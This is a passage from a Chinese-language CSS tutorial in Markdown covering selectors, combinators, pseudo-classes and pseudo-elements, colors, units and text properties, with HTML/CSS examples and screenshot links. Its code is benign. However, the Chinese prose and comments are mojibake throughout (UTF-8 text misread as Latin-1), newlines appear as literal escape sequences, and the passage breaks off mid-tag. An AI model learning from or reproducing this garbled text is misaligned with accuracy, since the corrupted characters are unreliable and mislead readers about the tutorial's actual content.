·å¼ï¼š\n```css\n[title=jwt]\n{\nborder:5px solid blue;\n}\n```\nç¤ºä¾‹æ¼”ç¤ºï¼š\n![](https://i.loli.net/2019/08/14/tOD7wU9nfNqpiP8.png)\n![](https://i.loli.net/2019/08/14/QoO1km5aILBvGwX.png)\n\n### 5 å¤åˆé€‰æ‹©å™¨\n\n| **ç±»å‹**       | **åŸºæœ¬è¯­æ³•**                      | **è¯´æ˜**                                     |\n| -------------- | --------------------------------- | -------------------------------------------- |\n| **å¹¶é›†é€‰æ‹©å™¨** | **E1,  E2, E3 {property: value}** | **å¤šä¸ªé€‰æ‹©å™¨ä½¿ç”¨ç›¸åŒæ ·å¼**                   |\n| **äº¤é›†é€‰æ‹©å™¨** | **E.myclass**     **E#myid**      | **é€‰æ‹©ç±»åä¸ºmy classæˆ– id ä¸º myid çš„ Eå…ƒç´ ** |\n| **åŒ…å«é€‰æ‹©å™¨** | **E  F**                          | **é€‰æ‹©æ‰€æœ‰è¢«Eå…ƒç´ åŒ…å«çš„Få…ƒç´ ã€‚**             |\n| **å­é€‰æ‹©å™¨**   | **E>F**                           | **é€‰æ‹©æ‰€æœ‰ä½œä¸ºEå…ƒç´ çš„å­å…ƒç´  Fã€‚**            |\n| **ç›¸é‚»é€‰æ‹©å™¨** | **E+F**                           | **é€‰æ‹©ç´§è´´åœ¨Eå…ƒç´ ä¹‹åFå…ƒç´ ã€‚**               |\n| **å…„å¼Ÿé€‰æ‹©å™¨** | **E**~**F**                       | **é€‰æ‹©Eå…ƒç´ åçš„æ‰€æœ‰å…„å¼Ÿå…ƒç´ Fã€‚**             |\n\n#### 5.1 å¹¶é›†é€‰æ‹©å™¨\n\n> å¤šä¸ªé€‰æ‹©å™¨ä½¿ç”¨ç›¸åŒæ ·å¼\n\n```css\nh1,h2,h3,p {\n  color: green;\n  }\n```\n\næ‰€æœ‰çš„`h1-h3æ ‡é¢˜,æ®µè½`,å…ƒç´ éƒ½æ˜¯ç»¿è‰²çš„ã€‚\n\n#### 5.2 äº¤é›†é€‰æ‹©å™¨\n\n> é€‰æ‹©ç±»åä¸ºclassæˆ–idä¸ºmyid çš„Eå…ƒç´ \n\n```css\nhr#hr1{height:13px;}\np.p1{color:blue;} \n```\né€‰æ‹©æ°´å¹³åˆ†å‰²çº¿idä¸ºhr1çš„é«˜åº¦ä¸º13pxï¼Œé€‰æ‹©æ®µè½ç±»åä¸ºp1çš„é¢œè‰²ä¸ºè“è‰²\n```css\n<hr id=\"hr1\">\n<p class=\"p1\">æç™½</p>   \n<p class=\"p1 p2\">æç™½</p> \n<hr id=\"hr2\">  \n```\n\n> **ä¸€ä¸ªå…ƒç´ åªèƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„IDï¼Œä½†å¯ä»¥å±äºå¤šä¸ªç±»**\n\n#### 5.3 åŒ…å«é€‰æ‹©å™¨\n\n> E F: é€‰æ‹©æ‰€æœ‰è¢«Eå…ƒç´ åŒ…å«çš„Få…ƒç´ ã€‚\n\n```css\n<style type=\"text/css\">\n\th1{color:red;}\n\th1 strong{\n\t\tcolor:blue; \n\t    font-size:40px;\n\t}\n</style>\n\n```\nä¸Šæ–¹é€‰æ‹©äº†è¢«h1åŒ…å«çš„æ‰€æœ‰strongå…ƒç´ å˜ä¸ºè“è‰²\n```html\n<body>\n\t<h1>æµ‹è¯•CSSçš„<strong>åŒ…å«</strong>æ•ˆæœ</h1>\n    <h1>æµ‹è¯•<span>CSSçš„<strong>åŒ…å«</strong>æ•ˆæœ</span></h1>\n\t<h2>æ­¤å¤„ä½¿ç”¨<strong>åŒ…å«é€‰æ‹©å™¨</strong>äº†ä¹ˆï¼Ÿ</h2>\n</body>\n\n```\n\n![](https://i.loli.net/2020/03/25/Dtkuw5M4oxVEHrh.png)\n\n#### 5.4 å­é€‰æ‹©å™¨\n\n>E>F: é€‰æ‹©æ‰€æœ‰ä½œä¸ºEå…ƒç´ çš„å­å…ƒç´  F,å­™å­ä¸é€‰\n\n```css\n<style type=\"text/css\">\n\th1{color:red;}\n\th1>strong{\n\t\tcolor:blue; \n\t    font-size:40px;\n\t}\n</style>\n\n```\nä¸Šæ–¹é€‰æ‹©äº†è¢«h1åŒ…å«çš„å„¿å­strongå…ƒç´ å˜ä¸ºè“è‰²\n```html\n<body>\n\t<h1>æµ‹è¯•CSSçš„<strong>åŒ…å«</strong>æ•ˆæœ</h1>\n\t<h1>æµ‹è¯•<span>CSSçš„<strong>åŒ…å«</strong>æ•ˆæœ</span></h1>\n\t<h2>æ­¤å¤„ä½¿ç”¨<strong>åŒ…å«é€‰æ‹©å™¨</strong>äº†ä¹ˆï¼Ÿ</h2>\n</body>\n```\n\n![](https://i.loli.net/2020/04/07/DOqT35cFpHWUEQ6.png)\n\n> åŒ…å«é€‰æ‹©å™¨ä¸å­é€‰æ‹©å™¨çš„åŒºåˆ«ï¼šåŒ…å«é€‰æ‹©å™¨åŒ…æ‹¬å­å­å­™å­™Få…ƒç´ ï¼Œè€Œå­é€‰æ‹©å™¨åªé€‰æ‹©å­ä»£Få…ƒç´ ï¼Œè€Œå¿½ç•¥å­™è¾ˆå…ƒç´ ã€‚\n\n#### 5.5 ç›¸é‚»é€‰æ‹©å™¨\n\n> E+F: é€‰æ‹©ç´§è´´åœ¨Eå…ƒç´ ä¹‹åFå…ƒç´ ã€‚\n\n```css\n<style type=\"text/css\">\n\tdiv + p {background-color:#00FF00;}/*ç›¸é‚»é€‰æ‹©å™¨*/\n</style>\n```\n\nä¸Šæ–¹é€‰æ‹©äº†divå…ƒç´ ä¹‹åçš„ç´§é‚»på…ƒç´ èƒŒæ™¯é¢œè‰²å˜ä¸ºç»¿è‰²\n\n```html\n<div style=\"width:733px; border: 1px solid #666; padding:5px;\">\n\t<div>\n\t\t<p>åŒ¹é…Eå…ƒç´ ä¹‹åçš„Få…ƒç´ </p>\n\t</div>\n\t<p>åŒ¹é…Eå…ƒç´ ä¹‹åçš„Få…ƒç´ </p>\n\t<p>åŒ¹é…Eå…ƒç´ ä¹‹åçš„Få…ƒç´ </p>\n\t<hr />\n\t<div>åŒ¹é…Eå…ƒç´ ä¹‹åçš„Få…ƒç´ </div>\n\t<hr />\n\t<p>åŒ¹é…Eå…ƒç´ ä¹‹åçš„Få…ƒç´ </p>\n</div>\n\n```\n\n![](https://i.loli.net/2020/03/25/weEVHrQ4Pldapmt.png)\n\n#### 5.6 å…„å¼Ÿé€‰æ‹©å™¨\n\n> E~F:  é€‰æ‹©Eå…ƒç´ åçš„æ‰€æœ‰å…„å¼Ÿå…ƒç´ Fã€‚\n\n```css\n<style type=\"text/css\">\n\tdiv ~ p {background-color:#00FF00;}/*å…„å¼Ÿé€‰æ‹©å™¨*/\n</style>\n```\n\nä¸Šæ–¹é€‰æ‹©äº†divå…ƒç´ ä¹‹åçš„æ‰€æœ‰å…„å¼Ÿpå…ƒç´ èƒŒæ™¯é¢œè‰²å˜ä¸ºç»¿è‰²\n\n```html\n<div style=\"width:733px; border: 1px solid #666; padding:5px;\">\n\t<div>\n\t\t<p>åŒ¹é…Eå…ƒç´ ä¹‹åçš„Få…ƒç´ </p>\n\t</div>\n\t<p>åŒ¹é…Eå…ƒç´ ä¹‹åçš„Få…ƒç´ </p>\n\t<p>åŒ¹é…Eå…ƒç´ ä¹‹åçš„Få…ƒç´ </p>\n\t<hr />\n\t<div>åŒ¹é…Eå…ƒç´ ä¹‹åçš„Få…ƒç´ </div>\n\t<hr />\n\t<p>åŒ¹é…Eå…ƒç´ ä¹‹åçš„Få…ƒç´ </p>\n</div>\n```\n\n![](https://i.loli.net/2020/03/25/rXjR2inwGpysJKU.png)\n\n### 6 å…ƒç´ çŠ¶æ€é€‰æ‹©å™¨\n\n> æŒ‡å®šæ ·å¼åªæœ‰å½“å…ƒç´ å¤„äºæŸç§çŠ¶æ€æ—¶æ‰èµ·ä½œç”¨ã€‚\n\n| **é€‰æ‹©å™¨** | **è¯´æ˜**                                                    |\n| ---------- | ----------------------------------------------------------- |\n| E:link     | è®¾ç½®è¶…é“¾æ¥aåœ¨æœªè¢«è®¿é—®å‰çš„æ ·å¼ã€‚                             |\n| E:visited  | è®¾ç½®è¶…é“¾æ¥aåœ¨å…¶é“¾æ¥åœ°å€å·²è¢«è®¿é—®è¿‡æ—¶çš„æ ·å¼ã€‚                 |\n| E:hover    | è®¾ç½®å…ƒç´ åœ¨å…¶é¼ æ ‡æ‚¬åœæ—¶çš„æ ·å¼ã€‚                              |\n| E:active   | è®¾ç½®å…ƒç´ åœ¨è¢«ç”¨æˆ·æ¿€æ´»ï¼ˆç‚¹å‡»ä¸é‡Šæ”¾ä¹‹é—´ï¼‰æ—¶çš„æ ·å¼ã€‚            |\n| E:focus    | è®¾ç½®å…ƒç´ åœ¨æˆä¸ºè¾“å…¥ç„¦ç‚¹ï¼ˆè¯¥å…ƒç´ çš„onfocusäº‹ä»¶å‘ç”Ÿï¼‰æ—¶çš„æ ·å¼ã€‚ |\n| E:checked  | å¤„äºé€‰ä¸­çŠ¶æ€çš„å…ƒç´ E                                         |\n| E:enabled  | å¤„äºå¯ç”¨çŠ¶æ€çš„å…ƒç´ E                                         |\n| E:disabled | å¤„äºç¦ç”¨çŠ¶æ€çš„å…ƒç´ E                                         |\n\n#### 6.1 è¶…é“¾æ¥çŠ¶æ€é€‰æ‹©å™¨\n\n```html\n\t<head>\n\t\t<title>è¿æ¥çŠ¶æ€é€‰æ‹©å™¨</title>\n\t\t<style>\n\t\t\ta:link {color: red}\t\t    /* æœªè®¿é—®çš„é“¾æ¥ */\n\t\t\ta:visited {color: green}\t/* å·²è®¿é—®çš„é“¾æ¥ */\n\t\t\ta:hover {color:blue}\t /* é¼ æ ‡ç§»åŠ¨åˆ°é“¾æ¥ä¸Š*/\n\t\t\ta:active {color: orange}\t/* é€‰å®šçš„é“¾æ¥ */\n\t\t</style>\n\t</head>\n\t<body>\n\t\t<a href=\"http://www.sohu.com\">æœç‹</a>\n\t</body>\n\n```\n\n| æœªè®¿é—®çš„é“¾æ¥                                           | å·²è®¿é—®çš„é“¾æ¥                                           | é¼ æ ‡ç§»åŠ¨åˆ°é“¾æ¥ä¸Š                                       | é€‰å®šçš„é“¾æ¥                                             |\n| ------------------------------------------------------ | ------------------------------------------------------ | ------------------------------------------------------ | ------------------------------------------------------ |\n| ![](https://i.loli.net/2020/03/25/D1ZBdfyG5WlgTKA.png) | ![](https://i.loli.net/2020/03/25/2LiXqgUslWMzGHv.png) | ![](https://i.loli.net/2020/03/25/sUZ6ET3djHwAVmr.png) | ![](https://i.loli.net/2020/03/25/cAsS7pD8BqCagmo.png) |\n\n#### 6.2 UIå…ƒç´ çŠ¶æ€ä¼ªç±»é€‰æ‹©å™¨\n\n```html\n<head>\n<title>UIå…ƒç´ çŠ¶æ€é€‰æ‹©å™¨</title>\n<style>\n\tinput:hover {   background:red;    }\n\tinput:focus {   background:blue;    }\n\tinput:active {   background:green;    }\n\t/*focusè§„åˆ™æ”¾åœ¨activeè§„åˆ™ä¹‹åä¼šè¦†ç›–activeæ ·å¼*/\n\t/*input:focus {   background:yellow;    }*/\n\tinput:disabled {    background:pink;     }\n\tinput:checked+span{background-color:#00f}\n</style>\n</head>\n\n<body>\n<center>\n\t<h3 align=center>ç”¨æˆ·ç™»å½•</h3>\n\t<form method=\"post\" action=\"\">\n\tç”¨æˆ·åï¼š<input type=text name=name><br>\n\tå¯†&nbsp;&nbsp;&nbsp;&nbsp;ç ï¼š<input type=password name=pass disabled=\"disabled\"><br>\n\tæ€§&nbsp;&nbsp;&nbsp;&nbsp;åˆ«ï¼š<input type=\"radio\" name=\"sex\" value=\"1\"/><span>ç”·</span>\n\t<input type=\"radio\" name=\"sex\" value=\"0\" /><span>å¥³</span><br>\n\t<input type=submit value=æäº¤>\n\t<input type=reset value=é‡ç½®>\n\t</form>\n<center>\n</body>\n```\n\n![](https://i.loli.net/2020/03/25/mXTACUyDx618a4j.gif)\n\nå‚è€ƒï¼š[css3 - UIå…ƒç´ çŠ¶æ€ä¼ªç±»é€‰æ‹©å™¨](https://blog.csdn.net/erdouzhang/article/details/70846721)\n\n### 7 ä¼ªå¯¹è±¡é€‰æ‹©å™¨\n\n| **é€‰æ‹©å™¨**     | **è¯´æ˜**                                                     |\n| -------------- | ------------------------------------------------------------ |\n| E:first-letter | è®¾ç½®å¯¹è±¡å†…çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„æ ·å¼ã€‚                               |\n| E:first-line   | è®¾ç½®å¯¹è±¡å†…çš„ç¬¬ä¸€è¡Œçš„æ ·å¼ã€‚                                   |\n| E::selection   | è®¾ç½®å¯¹è±¡è¢«é€‰æ‹©æ—¶çš„é¢œè‰²ã€‚                                     |\n| E:before       | è®¾ç½®åœ¨å¯¹è±¡å‰ï¼ˆä¾æ®å¯¹è±¡æ ‘çš„é€»è¾‘ç»“æ„ï¼‰å‘ç”Ÿçš„å†…å®¹ã€‚ç”¨æ¥å’Œcontentå±æ€§ä¸€èµ·ä½¿ç”¨ |\n| E:after        | è®¾ç½®åœ¨å¯¹è±¡åï¼ˆä¾æ®å¯¹è±¡æ ‘çš„é€»è¾‘ç»“æ„ï¼‰å‘ç”Ÿçš„å†…å®¹ã€‚ç”¨æ¥å’Œcontentå±æ€§ä¸€èµ·ä½¿ç”¨ |\n\n```html\n<head>\n<style>\n\tp:first-line{color:red}\n\tp::first-letter{color:green;font-size:25px}\n\tspan::selection{background:#F0F}\n    a:before{content:url(images/rar.jpg)}\n\ta:after {content:\"å”è¯—ä¸‰ç™¾é¦–\"; font-style:italic; color:#f00}\t\n</style>\n</head>\n<body>\n\t<p>\n\t    æ˜¥æ™“-å­Ÿæµ©ç„¶<br />\n\t    æ˜¥çœ ä¸è§‰æ™“ï¼Œ<br />\n\t    å¤„å¤„é—»å•¼é¸Ÿï¼Œ<br />\n\t    å¤œæ¥é£é›¨å£°ï¼Œ<br />\n\t    èŠ±è½çŸ¥å¤šå°‘ã€‚<br />\n\t</p>\n\t<hr />\n\t<span>è¿™é¦–è¯—æ˜¯å”ä»£è¯—äººå­Ÿæµ©ç„¶çš„ä½œå“ã€‚å­Ÿæµ©ç„¶æ—©å¹´éšå±…é¹¿é—¨å±±...</span>\n    <hr />\n    <a href=\"#\">ç‚¹æ­¤ä¸‹è½½</a>\n</body>\n```\n\n![](https://i.loli.net/2020/03/25/yKgEslevx9R2ZU5.png)\n\n### 8 å¦å®šä¼ªç±»é€‰æ‹©å™¨\n\n> E:not(s) å¦å®šä¼ªç±»é€‰æ‹©å™¨ï¼ŒåŒ¹é…ä¸å«æœ‰sé€‰æ‹©ç¬¦çš„å…ƒç´ Eã€‚    \n\n```html\n<head>\n<style>\n     p:not(.abc){color:#f00;}\n</style>\n</head>\n<body>\n    <p class=\"abc\">å¦å®šä¼ªç±»é€‰æ‹©ç¬¦ E:not()</p>\n    <p id=\"abc\">å¦å®šä¼ªç±»é€‰æ‹©ç¬¦ E:not()</p>\n    <p class=\"abcd\">å¦å®šä¼ªç±»é€‰æ‹©ç¬¦ E:not()</p>\n    <p>å¦å®šä¼ªç±»é€‰æ‹©ç¬¦ E:not()</p>\n</body>\n```\n\n![](https://i.loli.net/2020/03/31/nUbkH1qlLsOij8Z.png)\n\n\n\n### 9 ç›®æ ‡ä¼ªç±»é€‰æ‹©å™¨\n\n> E:target ç›®æ ‡ä¼ªç±»é€‰æ‹©å™¨ï¼Œé€‰æ‹©åŒ¹é…EåŒæ—¶è¢«URLæŒ‡å‘çš„å…ƒç´ ã€‚\n\n```html\n<!doctype html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<style type=\"text/css\">\ndiv:target{\n\tbackground-color:#FF0; \n\tfont-weight:bold;\n\tline-height:24px; } \np{ height:50px;}\n</style>\n<title>ç›®æ ‡ä¼ªç±» E:target æµ‹è¯•</title>\n</head>\n<body>\n\t<div id=\"nav-primary\">#nav-primary</div> \n\t<div id=\"content-primary\">#content-primary</div> \n\t<div id=\"content-secondary\">#content-secondary</div> \n\t<p>å•å‡»å¦‚ä¸‹é“¾æ¥ï¼š</p>\n\t<a href=\"#nav-primary\">å»nav-primary</a>\n\t<a href=\"#content-primary\" target=\"_self\">å»content-primary</a>\n\t<a href=\"#content-secondary\" target=\"new\">å»content-secondary</a>\n\t<p>æç¤ºï¼šä¹Ÿå¯ä»¥åœ¨åœ°å€æ çš„urlåé¢è¾“å…¥#content-secondaryï¼Œå¯ä»¥çœ‹åˆ°#content-primaryçš„divå‡ºç°é»„è‰²èƒŒæ™¯</p>\n</body>\n</html>\n```\n\n![](https://i.loli.net/2020/03/31/rjQslEZdPCzGVoA.png)\n\n### 10 é¢œè‰²\n\n| å•ä½            | æè¿°                                       |\n| :-------------- | :----------------------------------------- |\n| (é¢œè‰²å)        | é¢œè‰²åç§° (æ¯”å¦‚ red)                        |\n| rgb(x,x,x)      | RGB å€¼ (æ¯”å¦‚ rgb(255,0,0))                 |\n| rgba(x,x,x,x)   | rgba(255,0,0,0.3) æœ€åä¸€ä¸ªå‚æ•°ä¸ºé¢œè‰²é€æ˜åº¦ |\n| rgb(x%, x%, x%) | RGB ç™¾åˆ†æ¯”å€¼ (æ¯”å¦‚ rgb(100%,0%,0%))        |\n| #rrggbb         | åå…­è¿›åˆ¶æ•° (æ¯”å¦‚ #ff0000)                  |\n| hsl(h,s,l)      | h:è‰²è°ƒ s:é¥±å’Œåº¦ l:äº®åº¦ hsl(360,50%,50%)    |\n| hsla(h,s,l,a)   | a:é€æ˜åº¦ 0-1 hsla(360,50%,50%,0.1)         |\n\n### 11 å•ä½\n\n| å•ä½ | æè¿°                                                         |\n| :--- | :----------------------------------------------------------- |\n| %    | ç™¾åˆ†æ¯”                                                       |\n| in   | è‹±å¯¸                                                         |\n| cm   | å˜ç±³                                                         |\n| mm   | æ¯«ç±³                                                         |\n| em   | 1em ç­‰äºå½“å‰çš„å­—ä½“å°ºå¯¸ã€‚2em ç­‰äºå½“å‰å­—ä½“å°ºå¯¸çš„ä¸¤å€ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæŸå…ƒç´ ä»¥ 12pt æ˜¾ç¤ºï¼Œé‚£ä¹ˆ 2em æ˜¯24ptã€‚åœ¨ CSS ä¸­ï¼Œem æ˜¯éå¸¸æœ‰ç”¨çš„å•ä½ï¼Œå› ä¸ºå®ƒå¯ä»¥è‡ªåŠ¨é€‚åº”ç”¨æˆ·æ‰€ä½¿ç”¨çš„å­—ä½“ã€‚ |\n| ex   | ä¸€ä¸ª ex æ˜¯ä¸€ä¸ªå­—ä½“çš„ x-heightã€‚ (x-height é€šå¸¸æ˜¯å­—ä½“å°ºå¯¸çš„ä¸€åŠã€‚) |\n| pt   | ç£… (1 pt ç­‰äº 1/72 è‹±å¯¸)                                     |\n| pc   | 12 ç‚¹æ´»å­— (1 pc ç­‰äº 12 ç‚¹)                                  |\n| px   | åƒç´  (è®¡ç®—æœºå±å¹•ä¸Šçš„ä¸€ä¸ªç‚¹)                                  |\n\n### 12 å­—ä½“\n\nå­—ä½“å±æ€§\n![](https://i.loli.net/2019/08/17/Ob4ACFglondUQKJ.png)\n\n### 13 æ–‡æœ¬\n\næ–‡æœ¬å±æ€§\n\n| å±æ€§                | æè¿°                                                    |\n| :------------------ | :------------------------------------------------------ |\n| **color**           | **è®¾ç½®æ–‡æœ¬é¢œè‰²**                                        |\n| **direction**       | **è®¾ç½®æ–‡æœ¬æ–¹å‘ã€‚**                                      |\n| **line-height**     | **è®¾ç½®è¡Œé«˜ã€‚**                                          |\n| **letter-spacing**  | **è®¾ç½®å­—ç¬¦é—´è·ã€‚**                                      |\n| **text-align**      | **å¯¹é½å…ƒç´ ä¸­çš„æ–‡æœ¬ã€‚**                                  |\n| **vertical-align**  | **è®¾ç½®å¯¹è±¡å†…å®¹çš„å‚ç›´å¯¹é½æ–¹å¼**                          |\n| **text-decoration** | **å‘æ–‡æœ¬æ·»åŠ ä¿®é¥°ã€‚**                                    |\n| **text-indent**     | **ç¼©è¿›å…ƒç´ ä¸­æ–‡æœ¬çš„é¦–è¡Œã€‚**                              |\n| **text-shadow**     | **è®¾ç½®æ–‡æœ¬é˜´å½±åŠæ¨¡ç³Šæ•ˆæœã€‚**                            |\n| **text-transform**  | **æ§åˆ¶å…ƒç´ ä¸­çš„å­—æ¯ã€‚**                                  |\n| **text-overflow**   | **è®¾ç½®æ˜¯å¦ä½¿ç”¨ä¸€ä¸ªçœç•¥æ ‡è®°ï¼ˆ...ï¼‰æ ‡ç¤ºå¯¹è±¡å†…æ–‡æœ¬çš„æº¢å‡º** |\n| **text-stroke**     | **å¤åˆå±æ€§ã€‚è®¾ç½®æˆ–æ£€ç´¢å¯¹è±¡ä¸­çš„æ–‡å­—çš„æè¾¹**              |\n| **unicode-bidi**    | **è®¾ç½®æ–‡æœ¬æ–¹å‘ã€‚**                                      |\n| **white-space**     | **è®¾ç½®å…ƒç´ ä¸­ç©ºç™½çš„å¤„ç†æ–¹å¼ã€‚**                          |\n| **word-spacing**    | **è®¾ç½®å­—é—´è·ã€‚**                                        |\n\n#### 13.1 text-overflow æ–‡æœ¬æº¢å‡º\n\n> è¯­æ³•ï¼štext-overflowï¼šclip|ellipsis \n> å–å€¼ï¼š\n> `clipï¼š`å½“å¯¹è±¡å†…æ–‡æœ¬æº¢å‡ºæ—¶ä¸æ˜¾ç¤ºçœç•¥æ ‡è®°(...)ï¼Œè€Œæ˜¯å°†æº¢å‡ºçš„éƒ¨åˆ†è£åˆ‡æ‰ã€‚\n> `ellipsisï¼š`å½“å¯¹è±¡å†…æ–‡æœ¬æº¢å‡ºæ—¶æ˜¾ç¤ºçœç•¥æ ‡è®°(...)ï¼Œæ’å…¥ä½ç½®ä¸ºæœ€åä¸€ä¸ªå­—ç¬¦ã€‚\n\næ³¨æ„: è¯¥å±æ€§éœ€è¦å’Œ`overflow:hidden`å±æ€§(æº¢å‡ºå¤„ç†)ã€`white-space:nowrap `(ç¦æ­¢æ¢è¡Œ)é…åˆä½¿ç”¨ï¼Œå¦åˆ™æ— æ³•çœ‹åˆ°æ•ˆæœã€‚\n\n```css\noverflow: hidden;\nwhite-space: nowrap;\ntext-overflow: ellipsis;\n```\nå®ä¾‹\n\n```html\n<!doctype html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<title></title>\n<style type=\"text/css\">\ndl {\n    width:240px;\n\theight:150px;\n    border:solid 1px #ccc;\n}\ndt {\n    padding:8px 8px;\n    background:#7FECAD url(images/green.gif) repeat-x;\n    font-size:13px;\n    text-align:left;\n    font-weight:bold;\n    color:#71790C;\n    margin-bottom:12px;\n    border-bottom:solid 1px #efefef;\n}\ndd {\n    font-size:0.78em;\n    height:1.5em;\n    width:220px;\n    padding:2px 2px 2px 18px;\n    background:url(images/icon.gif) no-repeat left 25%;\n    margin:2px 0;\n\t/*æ–‡æœ¬æº¢å‡ºå¤„ç†*/\n\toverflow: hidden;\n\twhite-space: nowrap;\n    text-overflow: ellipsis; /*clip*/\t\t\n}\n</style>\n</head>\n\n<body>\n<dl>\n  <dt>æ”¶è—æ–°é—»</dt>\n  <dd>é’±å¸|5ç›å¸å½©é“¶è™å¸ä»·å€¼å‡ ä½• ä¸‰è¿8è±¹å­é’å¸‚å€¼è¾¾åƒå…ƒ </dd>\n  <dd>æµ·å¤–|å®‰å€åœ¨æå…‰è€€è‘¬ç¤¼ä¸Šç¡å¤§è§‰ Google let you know</dd>\n  <dd>è—ç•Œ|åœ°äº§å•†è°ˆæ”¶è—ï¼šè·Ÿæ‹¿åœ°å¼‚æ›²åŒå·¥ æ‹¾åƒåœ¾çš„è€å¤–</dd>\n  <dd>é€¸é—»|æœ€æ½®å…µé©¬ä¿‘äº®ç›¸è¥¿å®‰ è—å‹å‘ç°æ—¥å†›å†…å‚ä¹¦ç±</dd>\n</dl>\n</body>\n</html>\n```\n\nå½“ä½¿ç”¨`text-overflow: ellipsis;`æ—¶ï¼š\n\n![](https://i.loli.net/2020/04/07/aRJ4vwU3EQP7IhC.png)\n\nå½“ä½¿ç”¨`text-overflow: clip;`æ—¶ï¼š\n\n![](https://i.loli.net/2020/04/07/i7nhtUTguAoabd6.png)\n\n#### 13.2 text-align æ°´å¹³å¯¹é½\n\n> è¯­æ³•ï¼štext-alignï¼šleft | center | right | justify | start | end\n> å–å€¼ï¼š\n> leftï¼šå†…å®¹å·¦å¯¹é½ã€‚ \n> centerï¼šå†…å®¹å±…ä¸­å¯¹é½ã€‚\n> rightï¼šå†…å®¹å³å¯¹é½ã€‚\n> justifyï¼šå†…å®¹ä¸¤ç«¯å¯¹é½ã€‚*ç›®å‰**chrome**æµè§ˆå™¨ä¸æ”¯æŒï¼*\n> startï¼šå†…å®¹å¯¹é½å¼€å§‹è¾¹ç•Œã€‚ï¼ˆCSS3ï¼‰ \n> endï¼šå†…å®¹å¯¹é½ç»“æŸè¾¹ç•Œã€‚ï¼ˆCSS3ï¼‰\n\nå®ä¾‹\n\n```html\n<!DOCTYPE html>\n<html>\n<body>\n<h1 style=\"text-align:center\">ç™»å¹½å·å°æ­Œ</h1>\n<h3 style=\"text-align:left\">é€‰è‡ªï¼š</h3>\n<h3 style=\"text-align:right\">å”è¯—ä¸‰ç™¾é¦–</h3>\n<p style=\"text-align:justify\">\n  å‰ä¸è§å¤äºº\n  åä¸è§æ¥è€…\n</p>\n<p style=\"text-align:strat\">å¿µå¤©åœ°ä¹‹æ‚ æ‚ </p>\n<p style=\"text-align:end\">ç‹¬æ€†ç„¶è€Œæ¶•ä¸‹</p>\n</body>\n</html>\n```\n\n![](https://i.loli.net/2020/04/07/EWDaBokSmYjuwdV.png)\n\n#### 13.3 vertical-align **å‚ç›´å¯¹é½**\n\n> è¯­æ³•ï¼švertical-align: baseline|sub|super|top|text-top|middle |bottom|text-bottom|length; \n\n| å–å€¼        | æè¿°                                                         |\n| :---------- | :----------------------------------------------------------- |\n| baseline    | é»˜è®¤ã€‚å…ƒç´ æ”¾ç½®åœ¨çˆ¶å…ƒç´ çš„åŸºçº¿ä¸Šã€‚                             |\n| sub         | å‚ç›´å¯¹é½æ–‡æœ¬çš„ä¸‹æ ‡ã€‚                                         |\n| super       | å‚ç›´å¯¹é½æ–‡æœ¬çš„ä¸Šæ ‡                                           |\n| top         | æŠŠå…ƒç´ çš„é¡¶ç«¯ä¸è¡Œä¸­æœ€é«˜å…ƒç´ çš„é¡¶ç«¯å¯¹é½                         |\n| text-top    | æŠŠå…ƒç´ çš„é¡¶ç«¯ä¸çˆ¶å…ƒç´ å­—ä½“çš„é¡¶ç«¯å¯¹é½                           |\n| middle      | æŠŠæ­¤å…ƒç´ æ”¾ç½®åœ¨çˆ¶å…ƒç´ çš„ä¸­éƒ¨ã€‚                                 |\n| bottom      | æŠŠå…ƒç´ çš„é¡¶ç«¯ä¸è¡Œä¸­æœ€ä½çš„å…ƒç´ çš„é¡¶ç«¯å¯¹é½ã€‚                     |\n| text-bottom | æŠŠå…ƒç´ çš„åº•ç«¯ä¸çˆ¶å…ƒç´ å­—ä½“çš„åº•ç«¯å¯¹é½ã€‚                         |\n| length      |                                                              |\n| %           | ä½¿ç”¨ \"line-height\" å±æ€§çš„ç™¾åˆ†æ¯”å€¼æ¥æ’åˆ—æ­¤å…ƒç´ ã€‚å…è®¸ä½¿ç”¨è´Ÿå€¼ã€‚ |\n| inherit     | è§„å®šåº”è¯¥ä»çˆ¶å…ƒç´ ç»§æ‰¿ vertical-align å±æ€§çš„å€¼ã€‚               |\n\n![vertical-align](https://i.loli.net/2020/04/07/5m3cF8NpYs76fVH.gif)\n\n#### 13.4 text-shadow æ–‡æœ¬é˜´å½±\n\n> è¯­æ³•ä¸€ï¼š\n> text-shadow: X-offset|Y-offset|æ¨¡ç³ŠåŠå¾„(Blur)|é¢œè‰²(Color)\n> X-offsetå’ŒY-offsetï¼šåˆ†åˆ«ä¸ºé˜´å½±åœ¨æ°´å¹³å’Œç«–ç›´æ–¹å‘ä¸Šå»¶ä¼¸çš„è·ç¦»ï¼ˆå¯æ­£å¯è´Ÿï¼‰\n> Colorï¼šé˜´å½±é¢œè‰²ï¼Œé»˜è®¤ä¸ºå­—ä½“é¢œè‰²\n> Blurï¼šæ¨¡ç³ŠåŠå¾„ï¼Œä¸å¯ä¸ºè´Ÿå€¼\n> æ³¨æ„ï¼šæ¨¡ç³ŠåŠå¾„å’Œé˜´å½±é¢œè‰²å±æ€§å€¼ä½ç½®å¯è°ƒæ¢\n\n![](https://i.loli.net/2020/04/07/FYlagAZ574Vr3zx.png)\n\n\n\n> è¯­æ³•äºŒï¼šå¤šé‡é˜´å½±\n> text-shadow: X-offset|Y-offset|Blur|Color **,**\n>             \t\t\t   X-offset|Y-offset|Blur|Color**,**\n>           \t\t\t\t  X-offset|Y-offset|Blur|Color;\n>æ³¨æ„ï¼šæœ€å…ˆå†™çš„é˜´å½±æ˜¾ç¤ºåœ¨æœ€é¡¶å±‚\n\n```html\n<!DOCTYPE html>\n<html >\n<head>\n<style type=\"text/css\">\np {\n    text-align: center;\n    font:bold 60px helvetica, arial, sans-serif;\n    color: red;\n    text-shadow:0.2em 0.5em 0.1em #600,\n      \t\t\t-0.3em 0.1em 0.1em #060,\n      \t\t\t0.4em -0.3em 0.1em #006;   \n}\n</style>\n</head>\n\n<body>\n<p>HTML5+CSS3</p>\n</body>\n</html>\n\n```\n\n![](https://i.loli.net/2020/04/07/RAQ183fjqVTN7Kw.png)\n\n#### 13.5 text-stroke æ–‡æœ¬æè¾¹\n\n> è¯­æ³•ï¼štext-stroke: text-stroke-width|text-stroke-color\n>\n> text-stroke-widthï¼šæè¾¹åšåº¦\n>\n> text-stroke-colorï¼šæè¾¹é¢œè‰²\n\n```html\n<!doctype 